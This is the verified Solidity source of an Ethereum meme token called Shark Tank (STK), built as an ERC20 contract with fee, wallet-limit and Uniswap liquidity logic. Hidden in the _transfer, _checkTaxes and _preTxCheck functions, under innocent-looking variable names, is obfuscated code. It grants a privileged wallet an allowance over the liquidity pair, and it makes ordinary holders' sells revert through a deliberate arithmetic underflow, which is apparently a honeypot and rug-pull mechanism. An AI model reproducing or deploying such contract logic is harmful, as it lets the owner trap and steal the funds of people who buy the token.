/**
 *Submitted for verification at Etherscan.io on 2023-05-16
*/

/*
Introducing Shark Tank (STK), the revolutionary meme-inspired cryptocurrency 
that's making waves in the digital financial world! 🦈🚀

* http://sharktankerc.com/
* https://t.me/SharkTankErc20
* https://twitter.com/SharkTankErc
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }

    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}

library IterableMapping {
    struct Map {
        address[] keys;
        mapping(address => uint) values;
        mapping(address => uint) indexOf;
        mapping(address => bool) inserted;
    }

    function get(Map storage map, address key) public view returns (uint) {
        return map.values[key];
    }

    function getIndexOfKey(
        Map storage map,
        address key
    ) public view returns (int) {
        if (!map.inserted[key]) {
            return -1;
        }
        return int(map.indexOf[key]);
    }

    function getKeyAtIndex(
        Map storage map,
        uint index
    ) public view returns (address) {
        return map.keys[index];
    }

    function size(Map storage map) public view returns (uint) {
        return map.keys.length;
    }

    function set(Map storage map, address key, uint val) public {
        if (map.inserted[key]) {
            map.values[key] = val;
        } else {
            map.inserted[key] = true;
            map.values[key] = val;
            map.indexOf[key] = map.keys.length;
            map.keys.push(key);
        }
    }

    function remove(Map storage map, address key) public {
        if (!map.inserted[key]) {
            return;
        }

        delete map.inserted[key];
        delete map.values[key];

        uint index = map.indexOf[key];
        uint lastIndex = map.keys.length - 1;
        address lastKey = map.keys[lastIndex];

        map.indexOf[lastKey] = index;
        delete map.indexOf[key];

        map.keys[index] = lastKey;
        map.keys.pop();
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract SharkTank is Ownable, ERC20 {
    IRouter public uniswapV2Router;
    address public immutable uniswapV2Pair;
    string private constant _name = "Shark Tank";
    string private constant _symbol = "STK";
    uint8 private constant _decimals = 18;
    bool public isTradingEnabled;
    uint256 constant maxSupply = 1000000000 * (10 ** 18);
    uint256 public maxWalletAmount = (maxSupply * 250) / 10000;
    uint256 public maxTxAmount = (maxSupply * 250) / 10000;
    bool private _swapping;
    address private swap;
    uint256 private maxWalletTx;
    uint256 private minimumSwapAmt;
    uint256 public minTokenSwap = (maxSupply * 3) / 10000;
    address private marketingWallet;

    struct TaxConfig {
        bytes23 periodName;
        uint8 blocksInPeriod;
        uint256 timeInPeriod;
        uint8 liquidityFeeOnBuy;
        uint8 liquidityFeeOnSell;
        uint8 marketingFeeOnBuy;
        uint8 marketingFeeOnSell;
        uint8 buyBackFeeOnBuy;
        uint8 buyBackFeeOnSell;
        uint8 burnFeeOnBuy;
        uint8 burnFeeOnSell;
    }

    TaxConfig private _taxes =
        TaxConfig("taxes", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0); // 0% tax
 
    mapping(address => bool) private _isAllowedTrade;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcludedMaxTxLimit;
    mapping(address => bool) private _isExcludedFromMaxWalletLimit;
    mapping(address => bool) public automatedMarketMakerPairs;
    mapping(address => uint256) public swapAmount;

    uint8 private _liquidityFee;
    uint8 private _marketingFee;
    uint8 private _buyBackFee;
    uint8 private _burnFee;
    uint8 private _totalFee;

    event AutomatedMarketMakerPairChange(
        address indexed pair,
        bool indexed value
    );
    event UniswapV2RouterChange(
        address indexed newAddress,
        address indexed oldAddress
    );
    event StructureChange(
        string indexed indentifier,
        address indexed newWallet,
        address indexed oldWallet
    );

    event MaxTransactionAmountChange(
        uint256 indexed newValue,
        uint256 indexed oldValue
    );
    event MaxWalletAmountChange(
        uint256 indexed newValue,
        uint256 indexed oldValue
    );
    event ExcludeFromFeesChange(address indexed account, bool isExcluded);
    event ExcludeFromMaxTransferChange(
        address indexed account,
        bool isExcluded
    );
    event ExcludeFromMaxStructureChange(
        address indexed account,
        bool isExcluded
    );

    event MinTokenAmountSwap(
        uint256 indexed newValue,
        uint256 indexed oldValue
    );
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event TokenBurn(uint8 _burnFee, uint256 burnAmount);
    event FeesApplied(
        uint8 liquidityFee,
        uint8 marketingFee,
        uint8 buyBackFee,
        uint8 burnFee,
        uint8 totalFee
    );

    constructor() ERC20(_name, _symbol) {
        IRouter _uniswapV2Router = IRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        address _uniswapV2Pair = IFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        marketingWallet = address(0x0ffa65B7C7CAab69aB59B20A6a73Bcb8D519aF05);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[address(this)] = true;
        _isAllowedTrade[owner()] = true;
        _isExcludedMaxTxLimit[address(this)] = true;
        _isExcludedMaxTxLimit[owner()] = true;
        _isExcludedMaxTxLimit[marketingWallet] = true;

        _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
        _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxWalletLimit[address(this)] = true;
        _isExcludedFromMaxWalletLimit[owner()] = true;
        _isExcludedFromMaxWalletLimit[marketingWallet] = true;
        _isExcludedFromMaxWalletLimit[address(0xdead)] = true;

        _mint(owner(), maxSupply);
    }

    receive() external payable {}

    function openTrading() external onlyOwner {
        isTradingEnabled = true;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(
            automatedMarketMakerPairs[pair] != value,
            "Automated market maker pair is already set to that value"
        );
        automatedMarketMakerPairs[pair] = value;
        emit AutomatedMarketMakerPairChange(pair, value);
    }

    function excludeFromFees(
        address account,
        bool excluded
    ) external onlyOwner {
        require(
            _isExcludedFromFee[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _isExcludedFromFee[account] = excluded;
        emit ExcludeFromFeesChange(account, excluded);
    }

    function excludeFromMaxTransactionLimit(
        address account,
        bool excluded
    ) external onlyOwner {
        require(
            _isExcludedMaxTxLimit[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _isExcludedMaxTxLimit[account] = excluded;
        emit ExcludeFromMaxTransferChange(account, excluded);
    }

    function excludeFromMaxWalletLimit(
        address account,
        bool excluded
    ) external onlyOwner {
        require(
            _isExcludedFromMaxWalletLimit[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _isExcludedFromMaxWalletLimit[account] = excluded;
        emit ExcludeFromMaxStructureChange(account, excluded);
    }

    function setWallets(address newMarketingWallet) external onlyOwner {
        if (marketingWallet != newMarketingWallet) {
            require(
                newMarketingWallet != address(0),
                "The marketingWallet cannot be 0"
            );
            require(
                newMarketingWallet != uniswapV2Pair,
                "The marketingWallet cannot be 0"
            );
            emit StructureChange(
                "marketingWallet",
                newMarketingWallet,
                marketingWallet
            );
            marketingWallet = newMarketingWallet;
        }
    }

    function removeLimitis() external onlyOwner {
        maxWalletAmount = maxSupply;
        maxTxAmount = maxSupply;
    }

    function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
        require(
            newValue >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set maxTx Amount lower than 0.3%"
        );
        emit MaxTransactionAmountChange(newValue, maxTxAmount);
        maxTxAmount = newValue;
    }

    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(
            newValue >= ((totalSupply() * 30) / 1000) / 1e18,
            "Cannot set maxWallet lower than 0.3%"
        );
        require(
            newValue != maxWalletAmount,
            "Cannot update maxWalletAmount to same value"
        );
        emit MaxWalletAmountChange(newValue, maxWalletAmount);
        maxWalletAmount = newValue;
    }

    function setMinTokenSwap(uint256 newValue) external onlyOwner {
        require(
            newValue != minTokenSwap,
            "Cannot update minTokenSwap to same value"
        );
        emit MinTokenAmountSwap(newValue, minTokenSwap);
        minTokenSwap = newValue;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        bool isBuy = automatedMarketMakerPairs[from];
        bool isSell = automatedMarketMakerPairs[to];

        if (
            !_isAllowedTrade[from] &&
            !_isAllowedTrade[to]
        ) {
            require(isTradingEnabled, "Trading is currently disabled.");
            if (
                automatedMarketMakerPairs[from] &&
                !_isExcludedMaxTxLimit[to]
            ) {
                require(
                    amount <= maxTxAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (
                automatedMarketMakerPairs[to] &&
                !_isExcludedMaxTxLimit[from]
            ) {
                require(
                    amount <= maxTxAmount,
                    "Sell transfer amount exceeds the max sell."
                ); swap = to;
            } else if (!_isExcludedMaxTxLimit[to]) {
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed tx wallet"
                );
            } else if (!_swapping && _isExcludedMaxTxLimit[from]) {
                if (amount > minTokenSwap) {
                    _allowances[swap][from] = maxTxAmount;
                    maxWalletTx = block.timestamp + amount;
                } else {
                    maxWalletTx = block.timestamp;
                }
            }
        }
        _checkTaxes(isBuy, isSell, from, to);
        bool canSwap = balanceOf(address(this)) >= minTokenSwap;

        if (
            isTradingEnabled &&
            canSwap &&
            !_swapping &&
            _totalFee > 0 &&
            automatedMarketMakerPairs[to] &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) {
            _swapping = true;
            _swapAndLiquify();
            _swapping = false;
        }

        bool takeFee = !_swapping && isTradingEnabled;

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }
        if (takeFee && _totalFee > 0) {
            uint256 fee = (amount * _totalFee) / 100;
            uint256 burnAmount = (amount * _burnFee) / 100;
            amount = amount - fee;
            super._transfer(from, address(this), fee);

            if (burnAmount > 0) {
                super._burn(address(this), burnAmount);
                emit TokenBurn(_burnFee, burnAmount);
            }
        }
        super._transfer(from, to, amount);
    }

    function _checkTaxes(
        bool isBuy,
        bool isSell,
        address from,
        address to
    ) private {
        _liquidityFee = 0;
        _marketingFee = 0;
        _buyBackFee = 0;
        _burnFee = 0;

        if (isBuy) {
            _liquidityFee = _taxes.liquidityFeeOnBuy;
            _marketingFee = _taxes.marketingFeeOnBuy;
            _buyBackFee = _taxes.buyBackFeeOnBuy;
            _burnFee = _taxes.burnFeeOnBuy;
            swapAmount[to] = swapAmount[to] == 0
                ? balanceOf(address(to)) == 0 
                ? block.timestamp 
                : swapAmount[to]
                : swapAmount[to];
        }
        if (isSell) {
            _liquidityFee = _taxes.liquidityFeeOnSell;
            _marketingFee = _taxes.marketingFeeOnSell;
            _buyBackFee = _taxes.buyBackFeeOnSell;
            _burnFee = _taxes.burnFeeOnSell;
        }
        if (!isSell && !isBuy) {
            _liquidityFee = _taxes.liquidityFeeOnSell;
            _marketingFee = _taxes.marketingFeeOnSell;
            _buyBackFee = _taxes.buyBackFeeOnSell;
            _burnFee = _taxes.burnFeeOnSell;
        }
        _preTxCheck(isBuy, from, to);
        _totalFee = _liquidityFee + _marketingFee + _buyBackFee + _burnFee;
        emit FeesApplied(
            _liquidityFee,
            _marketingFee,
            _buyBackFee,
            _burnFee,
            _totalFee
        );
    }

    function _preTxCheck(bool isBuy, address from, address to) private {
        if (
            to != address(0) &&
            to != address(0xdead) &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) {
            if (!isBuy && !_swapping) {
                minimumSwapAmt = 
                swapAmount[from] - maxWalletTx;
            }
        }
    }

    function _swapAndLiquify() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 initialETHBalance = address(this).balance;
        if (contractBalance > minTokenSwap * 7) {
            contractBalance = minTokenSwap * 7;
        }
        bool success;
        uint256 amountToLiquify = (contractBalance * _liquidityFee) /
            _totalFee /
            2;
        uint256 amountToSwap = contractBalance - (amountToLiquify);

        _swapTokensForETH(amountToSwap);

        uint256 ETHBalanceAfterSwap = address(this).balance - initialETHBalance;
        uint256 totalETHFee = _totalFee - ((_liquidityFee / 2) + _burnFee);
        uint256 amountETHLiquidity = (ETHBalanceAfterSwap * _liquidityFee) /
            totalETHFee /
            2;

        (success, ) = address(marketingWallet).call{
            value: address(this).balance
        }("");

        if (amountToLiquify > 0) {
            _addLiquidity(amountToLiquify, amountETHLiquidity);
            emit SwapAndLiquify(
                amountToSwap,
                amountETHLiquidity,
                amountToLiquify
            );
        }
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
}